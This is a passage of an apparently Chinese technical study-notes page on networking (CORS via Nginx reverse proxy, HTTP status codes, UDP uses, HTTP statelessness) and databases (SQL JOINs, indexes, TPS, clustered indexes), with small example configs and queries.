发起请求。这时，这个请求不会受到同源策略的限制，可以直接进行。</li><li>服务器通过其他安全措施来保护资源和数据的安全，例如身份验证、授权机制、防火墙等。服务器端的安全依赖于开发者对访问控制和数据保护的管理，而不是依赖于同源策略。</li></ul><p><strong>总结</strong><br>同源策略只在浏览器环境中生效，用来保护用户的数据安全，防止跨站脚本攻击。而在非浏览器环境中，如服务器端代码、命令行工具、移动应用等，同源策略不适用，可以自由地发起跨源请求。因此，如果你的应用不涉及浏览器访问，就不需要考虑同源策略的限制。</p><h3 id="2-数据链路层中，哪种方法可以用于差错检测"><a href="#2-数据链路层中，哪种方法可以用于差错检测" class="headerlink" title="2. 数据链路层中，哪种方法可以用于差错检测"></a>2. 数据链路层中，哪种方法可以用于差错检测</h3><ul><li>奇偶检验（Parity Check）</li><li>循环冗余校验（Cyclic Redundancy Check, CRC）</li><li>校验和(CheckSum)</li><li>汉明码（Hamming Code）</li></ul><h3 id="3-跨域的解决方案，Nginx反向代理"><a href="#3-跨域的解决方案，Nginx反向代理" class="headerlink" title="3. 跨域的解决方案，Nginx反向代理"></a>3. 跨域的解决方案，Nginx反向代理</h3><p>正向代理是你正在用的VPN模式，即客户端通过代理访问服务器。</p><p>反向代理是代理服务器，也就是客户端所有的请求都会发送到Nginx服务器上，再由Nginx服务器对过来的请求进行分发。此时，所有的请求都将是同域的，因为所请求的协议+ip+端口Nginx配置的。</p><pre class="line-numbers language-none"><code class="language-none">server &#123; listen       9001; server_name  192.168.17.129; location ~ &#x2F;edu&#x2F; &#123;  proxy_pass  http:&#x2F;&#x2F;127.0.0.1:8080 &#125; location ~ &#x2F;vod&#x2F; &#123;  proxy_pass  http:&#x2F;&#x2F;127.0.0.1:8081 &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-http的状态码有哪些"><a href="#4-http的状态码有哪些" class="headerlink" title="4. http的状态码有哪些"></a>4. http的状态码有哪些</h3><p>HTTP 状态码分为 5 类，用来表示服务器响应的不同状态。这些状态码帮助客户端了解服务器的响应结果。以下是 HTTP 状态码的分类及常见的状态码：</p><h5 id="1xx：信息性响应"><a href="#1xx：信息性响应" class="headerlink" title="1xx：信息性响应"></a>1xx：信息性响应</h5><p>表示请求已接收，服务器正在处理。</p><ul><li><strong>100 Continue</strong>：请求部分已成功，客户端可以继续请求。</li><li><strong>101 Switching Protocols</strong>：服务器同意切换协议。</li><li><strong>102 Processing</strong>：服务器已收到并正在处理请求，但没有响应可用。</li></ul><h5 id="2xx：成功"><a href="#2xx：成功" class="headerlink" title="2xx：成功"></a>2xx：成功</h5><p>表示请求已成功被服务器接收、理解并处理。</p><ul><li><strong>200 OK</strong>：请求成功，响应的具体内容由方法决定（如GET请求返回资源，POST请求返回结果）。</li><li><strong>201 Created</strong>：请求成功并导致了资源的创建。</li><li><strong>202 Accepted</strong>：请求已被接受，但尚未处理完。</li><li><strong>203 Non-Authoritative Information</strong>：请求成功，但返回的信息不是来自原始服务器，而是经过第三方。</li><li><strong>204 No Content</strong>：请求成功，但不返回任何内容（如删除资源操作）。</li><li><strong>205 Reset Content</strong>：请求成功，请求者应重置视图。</li><li><strong>206 Partial Content</strong>：服务器仅返回了部分资源内容（常用于断点续传或多部分下载）。</li></ul><h5 id="3xx：重定向"><a href="#3xx：重定向" class="headerlink" title="3xx：重定向"></a>3xx：重定向</h5><p>表示客户端需要进一步操作才能完成请求。</p><ul><li><strong>300 Multiple Choices</strong>：请求有多个可选的响应，客户端可以选择。</li><li><strong>301 Moved Permanently</strong>：请求的资源已被永久移动到新位置。</li><li><strong>302 Found</strong>：临时重定向，请求的资源临时位于其他位置。</li><li><strong>303 See Other</strong>：请求的资源可以在另一 URI 获取，建议使用 GET 访问。</li><li><strong>304 Not Modified</strong>：资源未修改，客户端可以使用缓存副本。</li><li><strong>307 Temporary Redirect</strong>：资源临时重定向，客户端应该继续使用原来的请求方法。</li><li><strong>308 Permanent Redirect</strong>：资源已永久移动，和 301 类似，但客户端必须使用原请求方法。</li></ul><h5 id="4xx：客户端错误"><a href="#4xx：客户端错误" class="headerlink" title="4xx：客户端错误"></a>4xx：客户端错误</h5><p>表示请求有错误，服务器无法处理。</p><ul><li><strong>400 Bad Request</strong>：请求有语法问题，服务器无法理解。</li><li><strong>401 Unauthorized</strong>：请求未经授权，客户端需要提供认证。</li><li><strong>403 Forbidden</strong>：服务器理解请求，但拒绝执行。</li><li><strong>404 Not Found</strong>：服务器找不到请求的资源。</li><li><strong>405 Method Not Allowed</strong>：请求方法不被允许（如用 POST 请求一个只能 GET 的资源）。</li><li><strong>406 Not Acceptable</strong>：请求的内容特性不符合客户端的请求。</li><li><strong>408 Request Timeout</strong>：请求超时，服务器等待客户端发送请求时间过长。</li><li><strong>409 Conflict</strong>：请求与资源的当前状态发生冲突。</li><li><strong>410 Gone</strong>：请求的资源已被永久删除，且没有转发地址。</li><li><strong>411 Length Required</strong>：请求缺少 <code>Content-Length</code> 头，服务器拒绝接受没有指定长度的请求。</li><li><strong>413 Payload Too Large</strong>：请求实体过大，服务器无法处理。</li><li><strong>414 URI Too Long</strong>：请求的 URI 过长，服务器无法处理。</li><li><strong>415 Unsupported Media Type</strong>：服务器不支持请求的媒体格式。</li><li><strong>429 Too Many Requests</strong>：客户端发送了太多请求，被限制。</li></ul><h5 id="5xx：服务器错误"><a href="#5xx：服务器错误" class="headerlink" title="5xx：服务器错误"></a>5xx：服务器错误</h5><p>表示服务器在处理请求时出现了错误。</p><ul><li><strong>500 Internal Server Error</strong>：服务器遇到未预料的情况，无法完成请求。</li><li><strong>501 Not Implemented</strong>：服务器不支持请求的方法或功能。</li><li><strong>502 Bad Gateway</strong>：网关或代理服务器从上游服务器收到无效响应。</li><li><strong>503 Service Unavailable</strong>：服务器目前无法处理请求（超负载或维护）。</li><li><strong>504 Gateway Timeout</strong>：网关或代理服务器未能及时从上游服务器获取响应。</li><li><strong>505 HTTP Version Not Supported</strong>：服务器不支持请求使用的 HTTP 协议版本。</li></ul><p>每个状态码都由三位数字组成，第一位数字标识了状态的类别，后两位提供了具体的状态信息。</p><h3 id="5-UDP具体的使用场景"><a href="#5-UDP具体的使用场景" class="headerlink" title="5. UDP具体的使用场景"></a>5. UDP具体的使用场景</h3><p>UDP（User Datagram Protocol）是一种无连接、轻量级的传输层协议，常用于对速度和效率要求较高、但不需要严格保证数据可靠性的应用。以下是 UDP 的具体使用场景：</p><h4 id="1-实时-通信"><a href="#1-实时-通信" class="headerlink" title="1. 实时 通信"></a>1. <strong>实时 通信</strong></h4><p>UDP 非常适合用于需要低延迟的实时通信场景，在这些应用中，丢失一些数据包不会影响整体的用户体验。常见的应用包括：</p><ul><li><strong>VoIP（Voice over IP）</strong>：语音通话，例如 Skype、Zoom。实时语音传输需要低延迟，即使少量语音数据丢失也不会明显影响对话。</li><li><strong>视频通话</strong>：视频通话也对延迟敏感，少量的丢包或抖动不会严重影响用户体验。</li></ul><h4 id="2-实时视频流传输"><a href="#2-实时视频流传输" class="headerlink" title="2. 实时视频流传输"></a>2. <strong>实时视频流传输</strong></h4><p>在视频流媒体传输中，例如在线直播、IPTV、游戏直播等，实时性至关重要。UDP 可以快速传输视频帧，而不会像 TCP 那样因为丢包导致整体传输延迟。典型的协议有：</p><ul><li><strong>RTSP（Real-Time Streaming Protocol）</strong>：常用于实时视频流传输，底层通常使用 UDP 来减少延迟。</li><li><strong>RTP（Real-Time Transport Protocol）</strong>：视频和音频流媒体传输协议，通常使用 UDP 来实现低延迟传输。</li></ul><h4 id="3-在线游戏"><a href="#3-在线游戏" class="headerlink" title="3. 在线游戏"></a>3. <strong>在线游戏</strong></h4><ul><li>在多人在线游戏中，快速响应比数据完整性更重要。UDP 能够提供低延迟的通信，游戏服务器可以周期性地发送更新（如玩家的位置、状态等）。即使丢失某些数据包，游戏客户端也能通过后续的更新恢复正常状态。例如：<ul><li><strong>射击游戏（FPS）</strong></li><li><strong>竞技类游戏（MOBA）</strong></li></ul></li><li>这些游戏中，掉帧或者丢失少量状态信息不会影响游戏进程，UDP 的传输效率更能满足快速更新的需求。</li></ul><h4 id="4-广播和多播"><a href="#4-广播和多播" class="headerlink" title="4. 广播和多播"></a>4. <strong>广播和多播</strong></h4><p>UDP 支持多播（Multicast）和广播（Broadcast），非常适合应用在需要同时向多个终端发送相同数据的场景，例如：</p><ul><li><strong>IPTV</strong>：通过多播向多个用户发送电视信号流。</li><li><strong>局域网内的服务发现</strong>：设备在局域网内通过广播发送查询请求，如常见的 DHCP、UPnP 等协议使用 UDP 来在局域网内快速发现可用服务。</li><li><strong>在线教学</strong>：教师向多个学生广播数据流（如音视频）。</li></ul><h4 id="5-DNS-查询"><a href="#5-DNS-查询" class="headerlink" title="5. DNS 查询"></a>5. <strong>DNS 查询</strong></h4><ul><li><strong>DNS（Domain Name System）</strong>：互联网中的域名解析通常使用 UDP 进行 DNS 查询，因为大多数查询和响应的数据量较小，使用 UDP 可以降低延迟。对于超过 512 字节的查询，DNS 可以使用 TCP，但通常的域名解析都是通过 UDP 实现的。</li></ul><h4 id="6-简单的请求-响应协议"><a href="#6-简单的请求-响应协议" class="headerlink" title="6. 简单的请求-响应协议"></a>6. <strong>简单的请求-响应协议</strong></h4><ul><li>例如 <strong>TFTP（Trivial File Transfer Protocol）</strong>，是一种简单的文件传输协议，常用于网络设备的固件升级、系统配置文件传输等。它的实现基于 UDP，牺牲了一些可靠性来提升传输效率。</li></ul><h4 id="7-物联网（IoT）设备通信"><a href="#7-物联网（IoT）设备通信" class="headerlink" title="7. 物联网（IoT）设备通信"></a>7. <strong>物联网（IoT）设备通信</strong></h4><ul><li>物联网设备通常受限于网络带宽、计算能力和电源限制。UDP 协议可以通过减少开销来提高传输效率。某些轻量级的通信协议，如 <strong>CoAP（Constrained Application Protocol）</strong>，使用 UDP 来提供低资源占用的通信方式，常用于传感器、嵌入式设备等物联网设备的通信。</li></ul><h4 id="8-局域网（LAN）通信"><a href="#8-局域网（LAN）通信" class="headerlink" title="8. 局域网（LAN）通信"></a>8. <strong>局域网（LAN）通信</strong></h4><ul><li>在局域网内传输数据时，由于网络环境较为可靠，UDP 可以实现高速的数据交换。例如局域网内的文件共享、打印机的状态更新等，UDP 可以减少传输延迟和开销。</li></ul><h4 id="9-DHCP（动态主机配置协议）"><a href="#9-DHCP（动态主机配置协议）" class="headerlink" title="9. DHCP（动态主机配置协议）"></a>9. <strong>DHCP（动态主机配置协议）</strong></h4><ul><li><strong>DHCP（Dynamic Host Configuration Protocol）</strong> 通过 UDP 协议向网络设备分配 IP 地址。DHCP 使用 UDP 是因为它需要通过广播方式找到网络中的设备，并与它们交换数据，而 TCP 的连接建立方式不适合这种应用场景。</li></ul><h4 id="10-SNMP（简单网络管理协议）"><a href="#10-SNMP（简单网络管理协议）" class="headerlink" title="10. SNMP（简单网络管理协议）"></a>10. <strong>SNMP（简单网络管理协议）</strong></h4><ul><li><strong>SNMP（Simple Network Management Protocol）</strong> 是网络管理中常用的协议，通常使用 UDP 作为传输层协议。SNMP 需要快速地获取网络设备的状态或进行配置更新，因此 UDP 的轻量特性很适合这种快速、低开销的操作。</li></ul><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>UDP 的特点是 <strong>无连接、低延迟、低开销</strong>，但它不提供可靠性保证，因此适合需要实时性或广播、多播传输的场景。典型的应用场景包括 <strong>实时通信（如语音、视频通话）</strong>、<strong>在线游戏</strong>、<strong>视频流</strong>、<strong>物联网</strong>等。UDP 的设计使其能够快速传输数据，即使在丢包情况下，也不会像 TCP 那样影响整体传输速度，因此它广泛用于对数据完整性要求较低、但对速度和实时性要求较高的网络通信中。</p><h3 id="6-http为什么是无状态的，说说你的理解"><a href="#6-http为什么是无状态的，说说你的理解" class="headerlink" title="6. http为什么是无状态的，说说你的理解"></a>6. http为什么是无状态的，说说你的理解</h3><p>HTTP（Hypertext Transfer Protocol）被称为<strong>无状态协议</strong>，这意味着它在每次请求之间<strong>不会保留任何关于客户端的状态</strong>。服务器和客户端之间的每个请求都是独立的，与之前或之后的请求无关。</p><h4 id="我的理解："><a href="#我的理解：" class="headerlink" title="我的理解："></a>我的理解：</h4><ol><li><strong>无状态的本质</strong>： 每个 HTTP 请求都是<strong>独立的事务</strong>，服务器在处理每个请求时，不会自动记住之前发生的任何事情。换句话说，服务器不会记住用户在上一个请求中提交了什么数据，也不会跟踪会话信息。</li><li><strong>为什么 HTTP 是无状态的？</strong><ul><li><strong>简化设计</strong>：无状态协议的设计更简单，不需要服务器维护大量的会话数据，这大大简化了服务器的实现。</li><li><strong>更好的扩展性</strong>：由于服务器不需要保存每个客户端的状态，多个服务器可以在集群中分布式处理请求，提升扩展性。这使得 HTTP 特别适合于互联网的大规模应用。</li><li><strong>灵活性</strong>：每个请求可以被不同的服务器处理，客户端和服务器之间的连接是短暂的。它允许通过代理、缓存等方式更高效地分发和处理请求。</li></ul></li><li><strong>无状态的挑战与解决方案</strong>：<ul><li><strong>状态管理的需求</strong>：尽管 HTTP 是无状态的，但很多 web 应用（如购物车、登录会话等）需要管理用户的状态。为了解决这个问题，引入了 <strong>cookie</strong>、<strong>session</strong>、<strong>token</strong> 等机制。这些机制使得服务器和客户端能够在多个请求之间共享状态信息。</li><li><strong>Cookie</strong>：服务器通过在响应中发送一个 <code>Set-Cookie</code> 头，将状态信息存储在客户端浏览器中，客户端在后续的请求中会自动带上这个 cookie，服务器可以通过它识别客户端。</li><li><strong>Session</strong>：服务器可以在每次请求后生成一个唯一的会话标识符（如 <code>session_id</code>），并通过 <code>cookie</code> 或 <code>URL</code> 将它传递给客户端。客户端每次请求时会带上这个 ID，服务器就可以通过它来恢复客户端的状态。</li><li><strong>Token</strong>：常见于 REST API 和现代认证机制（如 JWT）。服务器通过签发一个加密的 token，客户端会在后续的请求中通过 HTTP 头（如 <code>Authorization</code>）传递 token，服务器通过解密这个 token 获取用户状态。</li></ul></li></ol><h4 id="实际场景下的无状态："><a href="#实际场景下的无状态：" class="headerlink" title="实际场景下的无状态："></a>实际场景下的无状态：</h4><ul><li>每次访问网页或资源时，浏览器会发送一个请求到服务器。服务器处理完请求后，返回响应，然后结束与客户端的交互。下次用户再访问同一个页面时，服务器不会“记住”之前访问的内容，必须依赖客户端发送的信息，如 cookie 或 session ID，来保持一些持久化的状态。</li><li>例如，用户打开一个电商网站，向购物车中添加商品时，服务器并不会自动记住用户之前的商品添加情况。购物车的状态需要依赖某种机制（如 session 或 cookie）来管理。</li></ul><h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h4><p>HTTP 无状态的设计让它能够在网络上实现更简洁、灵活、扩展性强的通信模型，但为了满足实际应用中状态管理的需求，使用了 cookie、session、token 等机制来弥补这一特性。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="1-KMP算法"><a href="#1-KMP算法" class="headerlink" title="1. KMP算法"></a>1. KMP算法</h3><p>这个我觉得讲的最清楚。<br>(<a href="https://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html)[https://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html]">https://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html)[https://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html]</a></p><h3 id="2-二叉排序树"><a href="#2-二叉排序树" class="headerlink" title="2. 二叉排序树"></a>2. 二叉排序树</h3><p>二叉排序树（Binary Search Tree, BST），也称为二叉查找树，是一种特殊的二叉树结构，它具有以下性质：</p><p><strong>二叉排序树的性质</strong></p><ul><li>节点的左子树：对于树中的任意一个节点，其左子树中所有节点的值都小于该节点的值。</li><li>节点的右子树：对于树中的任意一个节点，其右子树中所有节点的值都大于该节点的值。</li><li>每个子树都是二叉排序树：左子树和右子树本身也是二叉排序树，这使得整个树递归地满足二叉排序树的性质。</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="1-JOIN"><a href="#1-JOIN" class="headerlink" title="1. JOIN"></a>1. JOIN</h3><p>我们可以通过两个简单的表来演示不同类型的 SQL JOIN。</p><p>假设有两个表 <code>Customers</code> 和 <code>Orders</code>：</p><p><strong>Customers 表：</strong></p><table><thead><tr><th>CustomerID</th><th>CustomerName</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr><tr><td>3</td><td>Charlie</td></tr></tbody></table><p><strong>Orders 表：</strong></p><table><thead><tr><th>OrderID</th><th>CustomerID</th><th>Product</th></tr></thead><tbody><tr><td>101</td><td>1</td><td>Book</td></tr><tr><td>102</td><td>2</td><td>Pen</td></tr><tr><td>103</td><td>4</td><td>Notebook</td></tr></tbody></table><h5 id="1-INNER-JOIN-示例"><a href="#1-INNER-JOIN-示例" class="headerlink" title="1. INNER JOIN 示例"></a>1. INNER JOIN 示例</h5><pre class="line-numbers language-none"><code class="language-none">SELECT Customers.CustomerID, Customers.CustomerName, Orders.ProductFROM CustomersINNER JOIN Orders ON Customers.CustomerID &#x3D; Orders.CustomerID;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>结果：</strong></p><table><thead><tr><th>CustomerID</th><th>CustomerName</th><th>Product</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>Book</td></tr><tr><td>2</td><td>Bob</td><td>Pen</td></tr></tbody></table><p><strong>解释：</strong> INNER JOIN 只返回两个表中都有匹配行的记录。因为 <code>CustomerID = 3</code> 的 Charlie 没有对应的订单，<code>CustomerID = 4</code> 的订单也没有对应的客户，所以这些行不会出现在结果中。</p><h5 id="2-LEFT-JOIN-示例"><a href="#2-LEFT-JOIN-示例" class="headerlink" title="2. LEFT JOIN 示例"></a>2. LEFT JOIN 示例</h5><pre class="line-numbers language-none"><code class="language-none">SELECT Customers.CustomerID, Customers.CustomerName, Orders.ProductFROM CustomersLEFT JOIN Orders ON Customers.CustomerID &#x3D; Orders.CustomerID;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>结果：</strong></p><table><thead><tr><th>CustomerID</th><th>CustomerName</th><th>Product</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>Book</td></tr><tr><td>2</td><td>Bob</td><td>Pen</td></tr><tr><td>3</td><td>Charlie</td><td>NULL</td></tr></tbody></table><p><strong>解释：</strong> LEFT JOIN 返回左表中的所有记录，即使右表中没有匹配的记录。因为 Charlie 没有订单，所以他的 <code>Product</code> 列为 <code>NULL</code>。</p><h5 id="3-RIGHT-JOIN-示例"><a href="#3-RIGHT-JOIN-示例" class="headerlink" title="3. RIGHT JOIN 示例"></a>3. RIGHT JOIN 示例</h5><pre class="line-numbers language-none"><code class="language-none">SELECT Customers.CustomerID, Customers.CustomerName, Orders.ProductFROM CustomersRIGHT JOIN Orders ON Customers.CustomerID &#x3D; Orders.CustomerID;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>结果：</strong></p><table><thead><tr><th>CustomerID</th><th>CustomerName</th><th>Product</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>Book</td></tr><tr><td>2</td><td>Bob</td><td>Pen</td></tr><tr><td>4</td><td>NULL</td><td>Notebook</td></tr></tbody></table><p><strong>解释：</strong> RIGHT JOIN 返回右表中的所有记录，即使左表中没有匹配的记录。因为 <code>OrderID = 4</code> 的订单没有对应的客户，所以 <code>CustomerName</code> 列为 <code>NULL</code>。</p><h5 id="4-FULL-JOIN-示例"><a href="#4-FULL-JOIN-示例" class="headerlink" title="4. FULL JOIN 示例"></a>4. FULL JOIN 示例</h5><pre class="line-numbers language-none"><code class="language-none">SELECT Customers.CustomerID, Customers.CustomerName, Orders.ProductFROM CustomersFULL JOIN Orders ON Customers.CustomerID &#x3D; Orders.CustomerID;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>结果：</strong></p><table><thead><tr><th>CustomerID</th><th>CustomerName</th><th>Product</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>Book</td></tr><tr><td>2</td><td>Bob</td><td>Pen</td></tr><tr><td>3</td><td>Charlie</td><td>NULL</td></tr><tr><td>4</td><td>NULL</td><td>Notebook</td></tr></tbody></table><p><strong>解释：</strong> FULL JOIN 返回两个表中的所有记录。对于没有匹配的记录，会显示 <code>NULL</code>。所以，Charlie 没有订单，Order 101 没有对应的客户，结果中都显示 <code>NULL</code>。</p><h3 id="2-索引的作用"><a href="#2-索引的作用" class="headerlink" title="2. 索引的作用"></a>2. 索引的作用</h3><h4 id="示例场景："><a href="#示例场景：" class="headerlink" title="示例场景："></a>示例场景：</h4><p>假设我们有一个名为 <code>employees</code> 的表，用于存储公司员工的信息，表结构如下：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">CREATE TABLE employees (    employee_id INT PRIMARY KEY,    first_name VARCHAR(50),    last_name VARCHAR(50),    department VARCHAR(50),    salary DECIMAL(10, 2));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>employee_id</code> 是主键，代表每个员工的唯一标识。</p><h4 id="没有索引的查询："><a href="#没有索引的查询：" class="headerlink" title="没有索引的查询："></a>没有索引的查询：</h4><p>假设这个表里有一百万条记录，现在你想查询所有姓为 “Smith” 的员工：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">SELECT * FROM employees WHERE last_name &#x3D; &#39;Smith&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>没有索引的情况下</strong>，数据库必须对整个 <code>employees</code> 表进行全表扫描（Full Table Scan），也就是从第一条记录一直到最后一条记录，逐条检查 <code>last_name</code> 是否等于 “Smith”。</p><ul><li><strong>全表扫描的代价</strong>：对于一百万条记录，可能需要遍历所有的记录，时间复杂度为 O(n)，查询速度会非常慢，特别是在大表中。</li></ul><h4 id="建立索引："><a href="#建立索引：" class="headerlink" title="建立索引："></a>建立索引：</h4><p>为了加速这个查询，我们可以在 <code>last_name</code> 列上创建一个索引：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">CREATE INDEX idx_last_name ON employees(last_name);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>索引创建之后</strong>，数据库会在后台构建一个数据结构（例如 B-树），以 <code>last_name</code> 作为键来排序和存储记录的位置指针。</p><h4 id="有索引的查询："><a href="#有索引的查询：" class="headerlink" title="有索引的查询："></a>有索引的查询：</h4><p>再执行相同的查询：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">SELECT * FROM employees WHERE last_name &#x3D; &#39;Smith&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>有索引的情况下</strong>，查询过程如下：</p><ol><li><strong>查询索引</strong>：数据库首先查询 <code>idx_last_name</code> 索引，利用索引的排序特性，快速定位到所有 <code>last_name</code> 为 “Smith” 的记录。对于 B-树结构，查找的时间复杂度为 O(log n)。</li><li><strong>获取记录</strong>：找到符合条件的索引后，数据库通过索引中的指针直接访问对应的记录，而不需要扫描整个表。</li></ol><ul><li><strong>结果</strong>：通过索引，数据库可以极大地减少需要扫描的记录数，查询速度大幅提升，特别是在大表中。</li></ul><h4 id="索引的实际作用："><a href="#索引的实际作用：" class="headerlink" title="索引的实际作用："></a>索引的实际作用：</h4><p>为了更好理解，我们假设 <code>employees</code> 表的 <code>last_name</code> 列包含以下示例数据：</p><pre class="line-numbers language-none"><code class="language-none">| employee_id | first_name | last_name | department | salary  ||-------------|------------|-----------|------------|---------|| 1           | John       | Smith     | HR         | 50000.00|| 2           | Alice      | Johnson   | IT         | 60000.00|| 3           | Bob        | Smith     | Finance    | 55000.00|| ...         | ...        | ...       | ...        | ...     |<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>没有索引时</strong>：数据库从头开始扫描每一条记录，即使找到了匹配的记录（如 John Smith），它仍然必须继续扫描所有记录以确保找到所有匹配项。</li><li><strong>有索引时</strong>：数据库直接跳转到 <code>Smith</code> 这个位置开始检索，并且因为索引是排序的，能够快速定位所有 <code>Smith</code> 的记录。</li></ul><h4 id="其他类型的索引："><a href="#其他类型的索引：" class="headerlink" title="其他类型的索引："></a>其他类型的索引：</h4><h4 id="1-主键索引："><a href="#1-主键索引：" class="headerlink" title="1. 主键索引："></a>1. <strong>主键索引</strong>：</h4><ul><li><strong>自动创建</strong>：当你为表创建一个主键时，数据库会自动为这个主键创建一个唯一索引。例如，<code>employee_id</code> 列上默认有主键索引，所有基于 <code>employee_id</code> 的查询都会非常快。</li></ul><h4 id="2-联合索引（复合索引）："><a href="#2-联合索引（复合索引）：" class="headerlink" title="2. 联合索引（复合索引）："></a>2. <strong>联合索引（复合索引）</strong>：</h4><ul><li><p>示例：如果经常查询包含department和last_name的条件，可以创建一个联合索引：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">CREATE INDEX idx_dept_last_name ON employees(department, last_name);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>效果：这个索引会优化查询，例如：</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">SELECT * FROM employees WHERE department &#x3D; &#39;IT&#39; AND last_name &#x3D; &#39;Smith&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>原理</strong>：数据库会先根据 <code>department</code> 查找，再根据 <code>last_name</code> 进一步过滤，查询效率更高。</p></li></ul><h4 id="索引的代价："><a href="#索引的代价：" class="headerlink" title="索引的代价："></a>索引的代价：</h4><p>虽然索引提高了查询效率，但也有一定的代价：</p><ol><li><strong>存储开销</strong>：索引占用额外的存储空间。如果表中的数据量非常大，索引也会占用大量磁盘空间。</li><li><strong>维护开销</strong>：在插入、更新或删除记录时，数据库不仅需要修改表中的数据，还需要更新相关的索引。这会增加写操作的时间成本。</li></ol><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><ul><li><strong>索引的优势</strong>：主要在于提高查询速度，特别是在大数据集上，可以显著减少查询时间。</li><li><strong>索引的选择</strong>：应基于查询的频率和类型来决定在哪些列上建立索引。通常，在经常用于查询条件的列（如 <code>WHERE</code>、<code>JOIN</code> 等操作的列）上建立索引，可以带来明显的性能提升。</li></ul><p>通过这个例子，可以清楚地看到索引在提高数据库查询效率方面的作用，以及它的工作原理。</p><h3 id="3-一条查询语句在MySql服务端的执行过程"><a href="#3-一条查询语句在MySql服务端的执行过程" class="headerlink" title="3. 一条查询语句在MySql服务端的执行过程"></a>3. 一条查询语句在MySql服务端的执行过程</h3><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240818100418.png" alt="20240818100418"></p><h3 id="4-TPS-Transactions-Per-Second"><a href="#4-TPS-Transactions-Per-Second" class="headerlink" title="4. TPS Transactions Per Second"></a>4. TPS Transactions Per Second</h3><p>在数据库系统中，TPS 是 Transactions Per Second 的缩写，指的是系统每秒能够处理的事务数。它是衡量数据库系统性能的重要指标，特别是在高并发场景下。</p><p>什么是事务（Transaction）？<br>事务是数据库操作的一个逻辑单元，它通常包括一组数据库操作（如读取、写入、更新、删除），这些操作要么全部成功，要么全部失败。事务通常遵循 ACID 特性：</p><ul><li>Atomicity（原子性）: 事务的所有操作要么全部完成，要么全部回滚。</li><li>Consistency（一致性）: 事务完成后，数据库必须从一个一致性状态转换到另一个一致性状态。</li><li>Isolation（隔离性）: 事务之间互不干扰，一个事务的执行不会影响其他事务。</li><li>Durability（持久性）: 事务一旦提交，数据的变更是永久性的，即使系统崩溃也不会丢失。</li></ul><p>TPS 的含义：</p><ul><li>TPS 表示每秒可以执行的事务数量，通常用于评估数据库系统在高并发环境下的性能。</li><li>TPS 值越高，意味着系统在相同时间内能够处理的事务数量越多，表明系统的处理能力更强。</li><li>TPS 是数据库性能测试中的关键指标，通常与系统的响应时间、延迟、吞吐量等指标一起使用，全面反映数据库的运行效率。</li></ul><h3 id="5-数据库的聚簇索引和非聚簇索引的区别"><a href="#5-数据库的聚簇索引和非聚簇索引的区别" class="headerlink" title="5. 数据库的聚簇索引和非聚簇索引的区别"></a>5. 数据库的聚簇索引和非聚簇索引的区别</h3><table><thead><tr><th>特性</th><th>聚簇索引（Clustered Index）</th><th>非聚簇索引（Non-clustered Index）</th></tr></thead><tbody><tr><td>数据物理存储顺序</td><td>数据按照索引键值排序存储</td><td>数据存储顺序与索引无关</td></tr><tr><td>索引结构</td><td>索引的叶子节点是数据行</td><td>索引的叶子节点是指向数据的指针</td></tr><tr><td>数据检索效率</td><td>检索速度更快（不需要回表）</td><td>检索较慢，需要回表</td></tr><tr><td>适用场景</td><td>范围查询或排序</td><td>精确查找或多字段查询</td></tr><tr><td>插入和更新性能</td><td>较低（数据可能需要重排）</td><td>较高</td></tr><tr><td>一个表的数量限制</td><td>一个表只能有一个聚簇索引</td><td>一个表可以有多个非聚簇索引</td></tr></tbody></table><p>数据库在查询某一行数据时，不会逐个字段进行匹配，而是通过<strong>索引</strong>加速查找。如果没有索引，则会使用全表扫描来逐行检查，这种情况下才会逐个字段进行匹配操作。</p><p>你在一个电子商务平台的数据库里有一张 <code>Orders</code> 表，用于存储订单信息。表结构如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Orders <span class="token punctuation">(</span>    